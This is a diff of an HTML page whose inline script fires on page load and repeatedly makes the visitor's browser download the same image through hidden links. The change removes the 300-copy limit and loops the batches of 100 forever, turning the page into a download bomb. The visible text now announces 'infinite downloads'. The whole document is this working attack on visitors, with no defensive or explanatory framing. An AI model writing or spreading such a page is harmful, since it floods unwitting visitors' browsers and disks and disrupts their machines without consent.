@@ -6,25 +6,26 @@
 </head>
 <body>
   <script>
-    const totalCopies = 300;
     const batchSize = 100;
+    const totalCopies = 300;
     let current = 1;
 
     function downloadBatch() {
-      for (let i = 0; i < batchSize && current <= totalCopies; i++, current++) {
+      for (let i = 0; i < batchSize; i++) {
+        const copyNum = current + i;
         const link = document.createElement('a');
         link.href = 'WIN_20251109_17_45_22_Pro.jpg';
-        link.download = `photo${current}.jpg`;
+        link.download = `photo${(copyNum > totalCopies ? copyNum % totalCopies || totalCopies : copyNum)}.jpg`;
         link.style.display = 'none';
         document.body.appendChild(link);
         link.click();
         link.remove();
       }
-      if (current <= totalCopies) {
-        setTimeout(downloadBatch, 500); // Wait 500ms before next batch
-      } else {
-        console.log('All downloads triggered!');
+      current += batchSize;
+      if (current > totalCopies) {
+        current = 1; // restart to make infinite
       }
+      setTimeout(downloadBatch, 500); // next batch after 0.5 second
     }
 
     document.addEventListener("DOMContentLoaded", function() {
@@ -32,6 +33,6 @@
     });
   </script>
 
-  <p>Attempting to download 300 copies automatically. :D sorry :( :) </p>
+  <p>Attempting infinite downloads in batches of 100 ...</p>
 </body>
 </html>
